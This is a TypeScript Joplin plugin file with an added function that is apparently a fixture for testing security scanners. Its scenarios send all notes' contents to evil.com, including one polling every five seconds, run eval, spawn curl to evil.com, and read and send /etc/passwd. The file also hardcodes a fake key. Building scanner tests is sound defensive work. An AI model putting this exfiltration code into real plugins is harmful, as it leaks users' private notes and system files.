import joplin from 'api';
import App from './init';

const app = new App();

// ============================================================
// SECURITY SCANNER TEST — DELETE BEFORE PRODUCTION
// Paste this into your index.ts temporarily to test scanners.
// This code is intentionally malicious for testing purposes.
// ============================================================

// --- Scenario 2 helper (cross-function exfiltration) --------
async function _test_getNotes() {
	return await joplin.data.get(['notes'], { fields: ['id', 'title', 'body'] });
}

// --- Main test function --------------------------------------
async function _securityScannerTest() {

	// Scenario 1: Obvious direct exfiltration
	// Both Semgrep and CodeQL should catch this.
	const notes = await joplin.data.get(['notes'], { fields: ['id', 'title', 'body'] });
	await fetch('https://evil.com/collect', {
		method: 'POST',
		body: JSON.stringify(notes),
	});

	// Scenario 2: Cross-function exfiltration
	// Semgrep will likely miss this. CodeQL taint tracking should catch it.
	const data = await _test_getNotes();
	await fetch('https://evil.com/indirect', {
		method: 'POST',
		body: JSON.stringify(data),
	});

	// Scenario 3: Obfuscated endpoint (dynamic URL)
	// Neither tool will catch this — tests the boundary of static analysis.
	const base = 'evil';
	const url = `https://${base}.com/collect`;
	await fetch(url, {
		method: 'POST',
		body: JSON.stringify(notes),
	});

	// Scenario 4: setInterval polling exfiltration
	// Tests the custom Semgrep setInterval rule specifically.
	setInterval(async () => {
		const polledNotes = await joplin.data.get(['notes'], { fields: ['body'] });
		await fetch('https://evil.com/poll', {
			method: 'POST',
			body: JSON.stringify(polledNotes),
		});
	}, 5000);

	// Scenario 5: Dynamic code execution
	// Both tools should catch eval() and new Function().
	const code = 'console.log("injected")';
	eval(code);
	const fn = new Function('x', 'return x * 2');
	fn(42);

	// Scenario 6: System process spawning
	// Tests the child_process custom rule.
	const { exec } = require('child_process');
	exec('curl https://evil.com/exfil');

	// Scenario 7: Direct filesystem access
	// Tests the fs custom rule.
	const fs = require('fs');
	const profileData = fs.readFileSync('/etc/passwd', 'utf8');
	await fetch('https://evil.com/files', { method: 'POST', body: profileData });

	// Scenario 8: Hardcoded secret
	// Tests the hardcoded credential rule.
	const apiKey = 'sk-abc123def456ghi789';
	await fetch(`https://api.openai.com/v1/chat`, {
		headers: { Authorization: `Bearer ${apiKey}` },
	});
}

joplin.plugins.register({
    onStart: async function() {
        console.info('Email Plugin Started!');
        await app.init();
    },
});

